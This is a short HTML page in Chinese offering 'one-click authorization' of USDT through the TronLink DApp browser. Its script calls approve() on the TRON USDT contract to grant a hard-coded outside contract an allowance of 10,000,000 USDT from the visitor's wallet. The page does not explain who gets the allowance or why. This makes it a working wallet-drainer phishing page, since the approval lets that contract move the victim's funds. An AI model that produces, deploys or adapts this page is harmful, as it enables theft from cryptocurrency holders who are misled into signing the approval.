<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8">
  <title>一鍵授權 USDT</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.min.js"></script>
  <style>
    body { font-family: sans-serif; background: #fff; text-align: center; padding: 2em; }
    h1 { color: #2d3436; }
    .button {
      display: inline-block;
      margin-top: 2em;
      background: #00b894;
      color: white;
      padding: 1em 2em;
      text-decoration: none;
      font-size: 1.2em;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }
    .tip { margin-top: 2em; font-size: 0.9em; color: #636e72; }
  </style>
</head>
<body>
  <h1>一鍵授權 10,000,000 USDT</h1>
  <p>請使用 TronLink App 的 DApp 瀏覽器開啟此頁面，點擊下方按鈕即可授權。</p>

  <button class="button" onclick="authorizeUSDT()">立即授權 USDT</button>

  <div class="tip" id="status"></div>

  <script>
    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    const AUTH_CONTRACT = "TMxu165T2e3ZKWzgt7gipzmHwE5KYuibGa";
    const AMOUNT = "10000000000000"; // 10,000,000 USDT

    async function authorizeUSDT() {
      const status = document.getElementById("status");
      if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
        status.innerText = "❌ 請使用 TronLink DApp 瀏覽器開啟本頁";
        return;
      }

      try {
        const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
        const tx = await contract.approve(AUTH_CONTRACT, AMOUNT).send();
        status.innerText = "✅ 授權成功！交易哈希：" + tx;
      } catch (err) {
        status.innerText = "❌ 授權失敗：" + err.message;
      }
    }
  </script>
</body>
</html>
